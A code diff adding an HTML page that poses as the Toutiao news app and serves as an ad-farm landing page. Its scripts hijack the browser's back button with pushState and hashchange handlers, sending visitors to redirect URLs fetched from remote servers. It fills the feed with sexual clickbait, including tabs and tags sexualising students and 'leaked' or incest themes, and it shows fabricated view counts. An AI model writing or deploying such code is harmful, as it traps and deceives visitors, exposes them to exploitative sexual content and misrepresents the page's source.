@@ -1,0 +1,874 @@
+<!DOCTYPE html>
+<html style="width: 100%;height: 100%">
+<title>今日头条</title>
+<meta charset="UTF-8"/>
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0,user-scalable=no"/>
+<meta http-equiv="X-UA-Compatible" content="ie=edge"/>
+<link rel="stylesheet" href="./xxl/back_ret.css"/>
+<script src="http://cp4gzh.oss-cn-shanghai.aliyuncs.com/static/js/jquery-1.7.2.min.js" type="text/javascript"></script>
+<script>
+    var sys_global_url = 'http://xx3-88.oss-cn-shanghai.aliyuncs.com/xx8-88/xiaoshuo/'
+</script>
+<script src="http://cp4gzh.oss-cn-shanghai.aliyuncs.com/static/js/EventEmitter.min.js"></script>
+<script src="http://cp4gzh.oss-cn-shanghai.aliyuncs.com/static/js/art-template.js"></script>
+<script>
+
+    var advertising = '/bak/gg/?dcqd&&qdfanhui=1&';
+
+    function gogg(url){
+        history.pushState(history.length+1, "message", window.location.href.split('#')[0]+"#"+new Date().getTime());
+        if(navigator.userAgent.indexOf('Android') != -1){
+            if(typeof(tbsJs) != "undefined"){
+                tbsJs.onReady('{useCachedApi : "true"}', function(e) {})
+                window.onhashchange=function(){
+                    location.href = url;
+                };
+            }else{
+                var pop = 0;
+                window.onhashchange = function(event) {
+                    pop++
+                    if (pop >= 3) {
+                        location.href = url;
+                    }else{
+                        history.go(1)
+                    }
+                };
+                history.go(-1);
+            }
+        }else{
+            window.onhashchange=function(){
+                location.href = url;
+            };
+        }
+    }
+
+    //  gogg(advertising)
+
+    $.ajax({
+        type: 'GET',
+        url: 'http://api.qd2020.cn/api/get_share_link?params=fopXKtZCvLRn4jWPnbx%2FRZ5uqzKZ9smtlS35%2FmAgNdgdXdHlF7xq4p679m5d5z4QB7oQerdICOB2IuKfgDfb7U9sCCy5zt%2Bh%2FjYfbvEwrh1DuUnXX5hxwQZtDiBjHj3vD%2FQmpVFEalLGAHlgN%2F1ciReaJ5KMHnSz7fFOnWx7ubY%3D',
+        dataType: 'json',
+        success: function(data){
+            if(data.code == 200){
+
+                gogg(data.data.url)
+            } else {
+                adTwo()
+            }
+        },
+        error:  function(err){
+            adTwo()
+        },
+    })
+
+
+    function adTwo () {
+        $.get("/bak/gg/api/api_gg.php?feinanke&", function(result){
+
+            console.log(JSON.parse(result).domainname)
+            gogg(JSON.parse(result).domainname)
+        });
+    }
+
+    // gogg('http://hrbjfkj.cn/ZPfKfsXWd8m2j7x-xPWKiLiNRo7NpSPi3iecQncmKX4bn4d5U6SclFvesTDiALSjePEUtsCjwdV');
+</script>
+</head>
+
+<body style="width: 100%;height: 100%">
+<div class="tab-wrap" style="position: fixed;top: 0;background: white;width: 100vw;z-index: 9999999">
+    <div id="tabs" class="ret1-tabs">
+        <div class="tab-item active" >美女</div>
+        <div class="tab-item">学生</div>
+        <div class="tab-item">少妇</div>
+        <div class="tab-item">空姐</div>
+    </div>
+</div>
+<div style="height: 35px;"></div>
+<div class="container">
+    <div id="adList"></div>
+    <script id="ad-template-remen" type="text/html">
+        <div class="ad-template-info" onclick="Ad.adClick({{clickUrl}},{{dUrl}},{{pid}})">
+            <div class="item-left">
+                <div class="title">{{title}}</div>
+                <div class="item-extra">
+                    <span class="type-tag" style="border-color: red;color: red">热门</span>
+                    <div class="read-date">
+                        <span>浏览数：{{readNum}}</span>
+                        <span>{{date}}</span>
+                    </div>
+                </div>
+            </div>
+            <img class="ad-img" src="{{srcUrls[0]}}" alt="">
+        </div>
+    </script>
+
+    <!-- template 用于广告列表 单图 -->
+    <script id="ad-template" type="text/html">
+        <div class="ad-template-info" onclick="Ad.adClick({{clickUrl}},{{dUrl}},{{pid}})">
+            <div class="item-left">
+                <div class="title" style="letter-spacing: 3px;color: rgba(255, 0, 0, 0.7);font-size: 16px!important;">【{{beforeTitleTwo}}】{{title}}</div>
+            </div>
+            <img class="ad-img" src="{{srcUrls[0]}}" alt="">
+        </div>
+    </script>
+
+    <script id="ad-template-single-article" type="text/html">
+        <a class="ad-template-info ad-wrap-single" ref="noreferrer" href="{{newhref}}">
+            <div class="item-left">
+                <div class="title"  style="letter-spacing: 3px;color: rgba(0, 0, 255, 0.7);font-size: 16px!important;">{{titleNew}}</div>
+                <div class="item-extra">
+                    <span class="type-tag">文章</span>
+                    <div class="read-date">
+                        <span>{{readNum}}次浏览</span>
+                        <span>{{date}}</span>
+                    </div>
+                </div>
+            </div>
+            <div class="videoImg">
+                <img class="video-imgnew" src="{{imgNew}}" alt="">
+            </div>
+
+        </a>
+    </script>
+    <!-- template 用于广告列表 大图 -->
+    <script id="ad-template-big" type="text/html">
+        <div class="ad-template-info-big"  onclick="Ad.adClick({{clickUrl}},{{dUrl}},{{pid}},1,'')">
+            <div style="position: relative">
+                <div style="padding: 3px 8px 3px 8px;position: absolute;top: 8px;left: 0;color: white;font-size: 16px;
+				height: 50px;border-radius: 5px;background-image: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0));">{{title}}</div>
+                <img class="ad-img-big" style="height: 220px" src="{{srcUrls[0]}}" alt="">
+            </div>
+        </div>
+    </script>
+    <!-- 三图 -->
+    <script id="ad-template-3img" type="text/html">
+        <div class="ad-template-3img" onclick="Ad.adClick({{clickUrl}},{{dUrl}},{{pid}})">
+            <div class="title" style="letter-spacing: 3px;color: rgba(0, 200, 0, 1);font-size: 16px!important;-webkit-line-clamp: 2!important">【{{beforeTitle}}】{{title}}</div>
+            <div class="img_wrap">
+                {{each srcUrls as value}}
+                <img class="ad-img" src="{{value}}" alt="">
+                {{/each}}
+            </div>
+        </div>
+    </script>
+
+    <script id="ad-template-float" type="text/html">
+        <div class="ad-wrap-float top-xuanfu" onclick="Ad.adClick({{clickUrl}},{{dUrl}},{{pid}})">
+            <img class="ad-img" src="{{srcUrls[0]}}" alt="">
+        </div>
+    </script>
+</div>
+</body>
+<script>
+    /**
+     * Ad对象 仅用于竞价广告
+     */
+
+    var Ad = {
+        clickCallback: function () {
+        },
+        /**
+         * 请求广告数据
+         * data 要传的数据 默认已经穿了ua 这里一般只传pid即可
+         * callback 获取数据回调 callback(err,res)
+         * 注意：此方法只获取数据，渲染方法需与该方法解耦
+         */
+        fetchAd: function (data, callback, complete) {
+            var ua = navigator.userAgent
+            var data = data || {}
+
+            $.ajax({
+                type: 'get',
+                headers: {
+                    'User-Agent': ua
+                },
+                url: 'http://ssp.1rtb.com/client/req_ad',
+                data: $.extend(
+                    {
+                        device_ua: ua,
+                        type: 'api'
+                    },
+                    data
+                ),
+                dataType: 'jsonp', // jsonp格式访问
+                success: function (res) {
+                    callback && callback(null, res)
+                },
+                error: function (err) {
+                    callback && callback(err)
+                },
+                complete: function () {
+                    complete && complete()
+                }
+            })
+        },
+
+        /**
+         * 反弹
+         * @param {*} backUrl
+         * @returns
+         */
+        back: function (backUrl) {
+            if (!backUrl) {
+                return false
+            }
+            var fn = arguments.callee
+            if (fn.hasInit) {
+                return false
+            }
+            fn.hasInit = true
+            setTimeout(function () {
+                history.pushState(
+                    history.length + 1,
+                    'back',
+                    location.href + '#' + new Date().getTime()
+                )
+            }, 100)
+            window.onhashchange = function () {
+                location.href = backUrl
+            }
+        },
+
+        /**
+         * 广告被点击时
+         * clickUrl 点击率接口
+         * dUrl 广告落地页url
+         */
+        adClick: function (clickUrl, dUrl, pid) {
+            Ad.clickCallback(pid)
+
+            clickUrl.forEach(function (url) {
+                Ad.send(url)
+            })
+
+            if (dUrl) {
+                setTimeout(() => {
+                    location.href = dUrl[0]
+                }, 0)
+            }
+        },
+
+        /**
+         * 获取年月日
+         */
+        getDate: function () {
+            var date = new Date()
+            var year = date.getFullYear()
+            var month = date.getMonth() + 1
+            var strDate = date.getDate()
+            month = month < 10 ? '0' + month : month
+            strDate = strDate < 10 ? '0' + strDate : strDate
+            return year + '-' + month + '-' + strDate
+        },
+
+        /**
+         * 获取范围随机数
+         */
+        random: function (min, max) {
+            return Math.floor(Math.random() * (max - min + 1) + min)
+        },
+
+        /**
+         * 判断元素是否在可视区
+         * 用于广告曝光率
+         */
+        isElementInViewport: function (el) {
+            if (typeof jQuery === 'function' && el instanceof jQuery) {
+                el = el[0]
+            }
+
+            var rect = el.getBoundingClientRect()
+
+            return (
+                rect.top >= 0 &&
+                rect.left >= 0 &&
+                rect.bottom <=
+                (window.innerHeight || document.documentElement.clientHeight) &&
+                rect.right <= (window.innerWidth || document.documentElement.clientWidth)
+            )
+        },
+
+        /**
+         * 监测曝光率
+         * div 广告dom
+         * monitorUrl 广告曝光接口
+         */
+        checkMonitor: function (div, monitorUrl) {
+            var isInViewport = Ad.isElementInViewport(div)
+            if (isInViewport) {
+                monitorUrl.forEach(function (url) {
+                    Ad.send(url)
+                })
+                return
+            }
+
+            var checkFun = Ad.throttle(function () {
+                if (Ad.isElementInViewport(div)) {
+                    window.removeEventListener('scroll', checkFun, true)
+                    monitorUrl.forEach(function (url) {
+                        Ad.send(url)
+                    })
+                }
+            }, 200)
+
+            window.addEventListener('scroll', checkFun, true)
+        },
+
+        /**
+         * 节流
+         */
+        throttle: function (func, wait, options) {
+            var context, args, result
+            var timeout = null
+            var previous = 0
+            if (!options) options = {}
+            var later = function () {
+                previous = options.leading === false ? 0 : new Date().getTime()
+                timeout = null
+                result = func.apply(context, args)
+                if (!timeout) context = args = null
+            }
+            return function () {
+                var now = new Date().getTime()
+                if (!previous && options.leading === false) previous = now
+                // 计算剩余时间
+                var remaining = wait - (now - previous)
+                context = this
+                args = arguments
+                if (remaining <= 0 || remaining > wait) {
+                    if (timeout) {
+                        clearTimeout(timeout)
+                        timeout = null
+                    }
+                    previous = now
+                    result = func.apply(context, args)
+                    if (!timeout) context = args = null
+                } else if (!timeout && options.trailing !== false) {
+                    // options.trailing=true时，延时执行func函数
+                    timeout = setTimeout(later, remaining)
+                }
+                return result
+            }
+        },
+
+        /**
+         * 发送请求
+         */
+        send: function (url) {
+            var img = document.createElement('img')
+            img.src = url
+            img.style.display = 'none'
+            document.body.appendChild(img)
+        },
+
+        /**
+         * pid 广告位id
+         * templateId 模板script的id
+         * wrapDomId 插入广告模板的父级id
+         * adWrapClass 广告wrap的class 用于寻找被插入的广告
+         * data 拓展的数据
+         * @param {*} params
+         */
+        singleAd: function (params, callback) {
+
+            var newId = params.newId == undefined ? 'wfy' : params.newId
+            // console.log(newId)
+            var pid = params.pid
+            var isTop = params.isTop
+            var templateId = params.templateId
+            var wrapDomId = params.wrapDomId
+            var adWrapClass = params.adWrapClass
+            var data = params.data || {}
+
+            var test = {"1":{"id":1,"title":"\u6b63\u5728\u6c90\u6d74\u7684\u8339\u7389\uff0c\u88ab\u538b\u5728\u8eab\u4e0b\uff0c\u4f53\u9a8c\u7740\u4ed6\u7684\u575a\u786c"},"2":{"id":2,"title":"\u6e29\u5982\u7389\u5bb3\u7f9e\u7684\u629a\u6478\u7740\u4ed6\u7684\u575a\u786c\uff0c\u611f\u89c9\u5230\u4ed6\u7684\u5174\u594b~\u626d\u52a8\u7740\u81ea\u5df1\u7684\u7fd8\u81c0~"}}
+
+
+
+            Ad.fetchAd($.extend({pid: pid}, data), function (err, res) {
+                callback && callback(res)
+
+                var id = test[newId] == undefined ? '' : test[newId].id
+                var tjArr = ['私密链接', '快点进来', '精彩推荐', '极品少妇', '丝袜女郎', '网址推荐', '野战', '制服诱惑', '日韩泄漏', '主播热舞', '韩国女支持', '黑丝诱惑', '办公室', '校园春色', '屌丝逆袭', '学生教师'];
+
+                var tjArrTwo =['少妇篇', '主播篇', '素人系类', '另类', '性爱技巧', '少年阿宾', '车震篇', '现场秀', '艳遇篇',
+                    '校园春色', '近亲篇', '武侠古典', '都市激情', '长篇连载', '人妻女友篇', '老婆的同时', '领家姐姐']
+
+                if (id != '' || res) {
+                    var html = template(
+                        templateId,
+                        $.extend(res, {
+                            beforeTitle: makeRandomArr(tjArr, 1)[0], //日期
+                            beforeTitleTwo: makeRandomArr(tjArrTwo, 1)[0], //日期
+                            date: Ad.getDate(), // 日期
+                            titleNew:  newId == 'wfy' ? '' : test[newId].title, // 日期
+                            imgNew: Ad.makeRandomArr([sys_global_url + 'static/xxl/img/1.gif', sys_global_url + 'static/xxl/img/2.jpeg', sys_global_url + 'static/xxl/img/3.jpeg',sys_global_url + 'static/xxl/img/5.gif', sys_global_url + 'static/xxl/img/4.gif'], 1).join(''), // 日期
+
+                            newhref: newId == 'wfy' ? '' : './l1.php?book_id=' + test[newId].id, // 日期
+                            readNum: Ad.random(100000, 500000) // 阅读数
+                        })
+                    )
+
+                    // 插入模板生成的html
+
+
+                    if(isTop == 1) {
+                        $('#' + wrapDomId).html(html + $('#adList').html())
+                    } else {
+                        $('#' + wrapDomId).append(html)
+                    }
+
+
+                    // 查询被插入的广告 用于曝光监测
+                    var currAd = $('#' + wrapDomId + ' .' + adWrapClass + ':last')[0]
+                    // 启动广告曝光监测
+
+                    if (res != undefined) {
+                        Ad.checkMonitor(currAd, res.monitorUrl)
+                    }
+                }
+
+                // if (err) return
+                // 获取模板生成的html
+
+            })
+        },
+        makeRandomArr: function (arrList, num) { // 随机取出数组元素
+            if (num > arrList.length) {
+                num = arrList.length
+            }
+            const tempArr = arrList.slice(0)
+            const newArrList = []
+            for (var i = 0; i < num; i++) {
+                const random = Math.floor(Math.random() * (tempArr.length - 1))
+                const arr = tempArr[random]
+                tempArr.splice(random, 1)
+                newArrList.push(arr)
+            }
+            return newArrList
+        },
+    }
+
+    var adListIndex = 0;
+    var deny_cids = []; // 被禁止的创意广告id
+
+    var adList =  [
+
+        {
+            pid: '1013103', //广告位id
+            templateId: 'ad-template-big', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+        },
+
+
+// {
+//             pid: '1013105', //广告位id
+//             templateId: 'ad-template', //模板script的id
+//             wrapDomId: 'adList', //插入广告模板的父级id
+//             adWrapClass: 'ad-template-info' //广告wrap的class 用于寻找被插入的广告
+//         },
+        {
+            pid: '1009956', //广告位id
+            templateId: 'ad-template', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-info' //广告wrap的class 用于寻找被插入的广告
+        },
+        /*          {
+                    pid: '1013104', //广告位id
+                    templateId: 'ad-template-3img', //模板script的id
+                    wrapDomId: 'adList', //插入广告模板的父级id
+                    adWrapClass: 'ad-template-3img' //广告wrap的class 用于寻找被插入的广告
+                },*/
+
+        {
+            pid: '1009961', //广告位id
+            templateId: 'ad-template', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-info' //广告wrap的class 用于寻找被插入的广告
+        },
+        {
+            pid: '1009969', //广告位id
+            templateId: 'ad-template-big', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+        },
+        //   {
+        //         pid: '1009968', //广告位id
+        //         templateId: 'ad-template-3img', //模板script的id
+        //         wrapDomId: 'adList', //插入广告模板的父级id
+        //         adWrapClass: 'ad-template-3img' //广告wrap的class 用于寻找被插入的广告
+        //     },
+        {
+            newId:0,
+            pid: '', //广告位id
+            templateId: 'ad-template-single-article', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-single-article' //广告wrap的class 用于寻找被插入的广告
+        },
+
+
+        {
+            pid: '1009957', //广告位id
+            templateId: 'ad-template', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-info' //广告wrap的class 用于寻找被插入的广告
+        },
+        //   {
+        //         pid: '1009965', //广告位id
+        //         templateId: 'ad-template-3img', //模板script的id
+        //         wrapDomId: 'adList', //插入广告模板的父级id
+        //         adWrapClass: 'ad-template-3img' //广告wrap的class 用于寻找被插入的广告
+        //     },
+        {
+            newId:1,
+            pid: '', //广告位id
+            templateId: 'ad-template-single-article', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-single-article' //广告wrap的class 用于寻找被插入的广告
+        },
+        {
+            pid: '1009966', //广告位id
+            templateId: 'ad-template-big', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+        },
+        //   {
+        //     pid: '1013105', //广告位id
+        //     templateId: 'ad-template', //模板script的id
+        //     wrapDomId: 'adList', //插入广告模板的父级id
+        //     adWrapClass: 'ad-template-info' //广告wrap的class 用于寻找被插入的广告
+        // },
+        //  {
+        //     pid: '1009962', //广告位id
+        //     templateId: 'ad-template-3img', //模板script的id
+        //     wrapDomId: 'adList', //插入广告模板的父级id
+        //     adWrapClass: 'ad-template-3img' //广告wrap的class 用于寻找被插入的广告
+        // },
+        {
+            pid: '1009963', //广告位id
+            templateId: 'ad-template-big', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+        },
+        {
+            newId:2,
+            pid: '', //广告位id
+            templateId: 'ad-template-single-article', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-single-article' //广告wrap的class 用于寻找被插入的广告
+        },
+
+        //     {
+        //     pid: '1009959', //广告位id
+        //     templateId: 'ad-template-3img', //模板script的id
+        //     wrapDomId: 'adList', //插入广告模板的父级id
+        //     adWrapClass: 'ad-template-3img' //广告wrap的class 用于寻找被插入的广告
+        // },
+        {
+            pid: '', //广告位id
+            templateId: 'ad-template-single-article', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-single-article' //广告wrap的class 用于寻找被插入的广告
+        },
+        {
+            pid: '1009954', //广告位id
+            templateId: 'ad-template-big', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+        },
+        {
+            newId:3,
+            pid: '', //广告位id
+            templateId: 'ad-template-single-article', //模板script的id
+            wrapDomId: 'adList', //插入广告模板的父级id
+            adWrapClass: 'ad-template-single-article' //广告wrap的class 用于寻找被插入的广告
+        },
+        //   {
+        //     pid: '1009960', //广告位id
+        //     templateId: 'ad-template-big', //模板script的id
+        //     wrapDomId: 'adList', //插入广告模板的父级id
+        //     adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+        // },
+
+    ];
+
+    var ee = new EventEmitter();
+
+    $(function() {
+        /* 自定义事件 用于广告 deny_cids 禁用重复广告 */
+        ee.addListener('fetch-jj-ad', function() {
+            var curData = adList[adListIndex];
+            //请求并渲染广告
+            Ad.singleAd(
+                $.extend(curData, {
+                    data: {
+                        app_id: parseInt(curData.pid) == 1014397 ? 102557 : 101918,
+                        deny_cids: deny_cids.join(',')
+                    }
+                }),
+                function(res) {
+                    if (adListIndex === adList.length - 1) return;
+
+                    if (res && deny_cids.indexOf(res.cid) == -1) {
+                        /* 当前广告请求完毕后 将广告的cid(创意id)插入 deny_cids 用于防止广告重复 */
+                        deny_cids.push(res.cid); //插入创意id 用于广告位被重复广告占用
+                    }
+
+                    adListIndex++;
+                    /* 请求下个广告 */
+                    ee.emitEvent('fetch-jj-ad');
+                }
+            );
+        });
+
+        ee.emitEvent('fetch-jj-ad');
+    });
+    var temp = 1
+
+    $(window).scroll(function(){
+
+        var scrollTop = $(this).scrollTop();
+        var scrollHeight = $(document).height();
+        var windowHeight = $(this).height();
+        if(scrollTop + windowHeight == scrollHeight && temp <3) {
+            var eee = new EventEmitter();
+            var newIndex = 0
+            var tempArr =  [
+                //           {
+                //     pid: '1009967', //广告位id
+                //     templateId: 'ad-template', //模板script的id
+                //     wrapDomId: 'adList', //插入广告模板的父级id
+                //     adWrapClass: 'ad-template-info' //广告wrap的class 用于寻找被插入的广告
+                // },
+                {
+                    pid: '1009969', //广告位id
+                    templateId: 'ad-template-big', //模板script的id
+                    wrapDomId: 'adList', //插入广告模板的父级id
+                    adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+                },
+//   {
+//             pid: '1013105', //广告位id
+//             templateId: 'ad-template', //模板script的id
+//             wrapDomId: 'adList', //插入广告模板的父级id
+//             adWrapClass: 'ad-template-info' //广告wrap的class 用于寻找被插入的广告
+//         },
+                {
+                    pid: '1009957', //广告位id
+                    templateId: 'ad-template', //模板script的id
+                    wrapDomId: 'adList', //插入广告模板的父级id
+                    adWrapClass: 'ad-template-info' //广告wrap的class 用于寻找被插入的广告
+                },
+                // {
+                //     pid: '1009965', //广告位id
+                //     templateId: 'ad-template-3img', //模板script的id
+                //     wrapDomId: 'adList', //插入广告模板的父级id
+                //     adWrapClass: 'ad-template-3img' //广告wrap的class 用于寻找被插入的广告
+                // },
+
+                //     {
+                //     pid: '1009959', //广告位id
+                //     templateId: 'ad-template-3img', //模板script的id
+                //     wrapDomId: 'adList', //插入广告模板的父级id
+                //     adWrapClass: 'ad-template-3img' //广告wrap的class 用于寻找被插入的广告
+                // },
+            ]
+            var newAds =makeRandomArr(tempArr, 2)
+            eee.addListener('fetch-jj-ad', function() {
+                var curData = newAds[newIndex];
+//请求并渲染广告
+
+                Ad.singleAd(
+                    $.extend(curData, {
+                        data: {
+                            app_id: parseInt(curData.pid) == 1014646 ? 102587 : 101918,
+                            deny_cids: deny_cids.join(',')
+                        }
+                    }),
+                    function(res) {
+                        if (newIndex === newAds.length - 1) return;
+                        if (res && deny_cids.indexOf(res.cid) == -1) {
+                            /* 当前广告请求完毕后 将广告的cid(创意id)插入 deny_cids 用于防止广告重复 */
+                            deny_cids.push(res.cid); //插入创意id 用于广告位被重复广告占用
+                        }
+                        newIndex++;
+                        /* 请求下个广告 */
+                        eee.emitEvent('fetch-jj-ad');
+                    }
+                );
+            });
+            eee.emitEvent('fetch-jj-ad');
+            temp++
+        } else if(scrollTop + windowHeight == scrollHeight &&3<temp < 8){
+            var eee = new EventEmitter();
+            var newIndex = 0
+            var tempArr = [
+                //   {
+                //     pid: '1009967', //广告位id
+                //     templateId: 'ad-template', //模板script的id
+                //     wrapDomId: 'adList', //插入广告模板的父级id
+                //     adWrapClass: 'ad-template-info' //广告wrap的class 用于寻找被插入的广告
+                // },
+                {
+                    pid: '1009969', //广告位id
+                    templateId: 'ad-template-big', //模板script的id
+                    wrapDomId: 'adList', //插入广告模板的父级id
+                    adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+                },
+                {
+                    pid: '1009960', //广告位id
+                    templateId: 'ad-template-big', //模板script的id
+                    wrapDomId: 'adList', //插入广告模板的父级id
+                    adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+                },
+                {
+                    pid: '1009966', //广告位id
+                    templateId: 'ad-template-big', //模板script的id
+                    wrapDomId: 'adList', //插入广告模板的父级id
+                    adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+                },
+                //   {
+                //     pid: '1013105', //广告位id
+                //     templateId: 'ad-template', //模板script的id
+                //     wrapDomId: 'adList', //插入广告模板的父级id
+                //     adWrapClass: 'ad-template-info' //广告wrap的class 用于寻找被插入的广告
+                // },
+                {
+                    pid: '1009963', //广告位id
+                    templateId: 'ad-template-big', //模板script的id
+                    wrapDomId: 'adList', //插入广告模板的父级id
+                    adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+                },
+                //  {
+                //             pid: '1009957', //广告位id
+                //             templateId: 'ad-template', //模板script的id
+                //             wrapDomId: 'adList', //插入广告模板的父级id
+                //             adWrapClass: 'ad-template-info' //广告wrap的class 用于寻找被插入的广告
+                //         },
+            ]
+            var newAds =makeRandomArr(tempArr, 3)
+
+            eee.addListener('fetch-jj-ad', function() {
+                var curData = newAds[newIndex];
+//请求并渲染广告
+
+                Ad.singleAd(
+                    $.extend(curData, {
+                        data: {
+                            app_id: parseInt(curData.pid) == 1014646 ? 102587 : 101918,
+                            deny_cids: deny_cids.join(',')
+                        }
+                    }),
+                    function(res) {
+                        if (newIndex === newAds.length - 1) return;
+                        if (res && deny_cids.indexOf(res.cid) == -1) {
+                            /* 当前广告请求完毕后 将广告的cid(创意id)插入 deny_cids 用于防止广告重复 */
+                            deny_cids.push(res.cid); //插入创意id 用于广告位被重复广告占用
+                        }
+                        newIndex++;
+                        /* 请求下个广告 */
+                        eee.emitEvent('fetch-jj-ad');
+                    }
+                );
+            });
+            eee.emitEvent('fetch-jj-ad');
+            temp++
+        }
+
+    })
+
+    $('#tabs div').bind('click', function() {
+        window.scrollTo({
+            top: 0,
+            behavior: "smooth"
+        });
+        $('#tabs div').removeClass('active')
+        $(this).addClass('active')
+        var eee = new EventEmitter();
+        var newIndex = 0
+
+        var tempArr = [
+            {isTop: 1,
+                pid: '1009969', //广告位id
+                templateId: 'ad-template-big', //模板script的id
+                wrapDomId: 'adList', //插入广告模板的父级id
+                adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+            },
+            {isTop: 1,
+                pid: '1009960', //广告位id
+                templateId: 'ad-template-big', //模板script的id
+                wrapDomId: 'adList', //插入广告模板的父级id
+                adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+            },
+            {isTop: 1,
+                pid: '1009966', //广告位id
+                templateId: 'ad-template-big', //模板script的id
+                wrapDomId: 'adList', //插入广告模板的父级id
+                adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+            },
+            {isTop: 1,
+                pid: '1009963', //广告位id
+                templateId: 'ad-template-big', //模板script的id
+                wrapDomId: 'adList', //插入广告模板的父级id
+                adWrapClass: 'ad-template-info-big' //广告wrap的class 用于寻找被插入的广告
+            },
+            {isTop: 1,
+                pid: '1009957', //广告位id
+                templateId: 'ad-template', //模板script的id
+                wrapDomId: 'adList', //插入广告模板的父级id
+                adWrapClass: 'ad-template-info' //广告wrap的class 用于寻找被插入的广告
+            },
+
+
+            // {isTop: 1,
+            //     pid: '1009965', //广告位id
+            //     templateId: 'ad-template-3img', //模板script的id
+            //     wrapDomId: 'adList', //插入广告模板的父级id
+            //     adWrapClass: 'ad-template-3img' //广告wrap的class 用于寻找被插入的广告
+            // },
+
+        ]
+        var newAds =makeRandomArr(tempArr, 1)
+
+        eee.addListener('fetch-jj-ad', function() {
+            var curData = newAds[newIndex];
+            //请求并渲染广告
+
+            Ad.singleAd(
+                $.extend(curData, {
+                    data: {
+                        app_id: parseInt(curData.pid) == 1014646 ? 102587 : 101918,
+                        deny_cids: deny_cids.join(',')
+                    }
+                }),
+                function(res) {
+                    if (newIndex === newAds.length - 1) return;
+                    if (res && deny_cids.indexOf(res.cid) == -1) {
+                        /* 当前广告请求完毕后 将广告的cid(创意id)插入 deny_cids 用于防止广告重复 */
+                        deny_cids.push(res.cid); //插入创意id 用于广告位被重复广告占用
+                    }
+                    newIndex++;
+                    /* 请求下个广告 */
+                    eee.emitEvent('fetch-jj-ad');
+                }
+            );
+        });
+        eee.emitEvent('fetch-jj-ad');
+    })
+
+    function makeRandomArr(arrList, num) { // 随机取出数组元素
+        if (num > arrList.length) {
+            num = arrList.length // eslint-disable-line
+        }
+        var tempArr = arrList.slice(0)
+        var newArrList = []
+        for (var i = 0; i < num; i++) {
+            var random = Math.floor(Math.random() * (tempArr.length))
+            var arr = tempArr[random]
+            tempArr.splice(random, 1)
+            newArrList.push(arr)
+        }
+        return newArrList
+    }
+</script>
+</html>
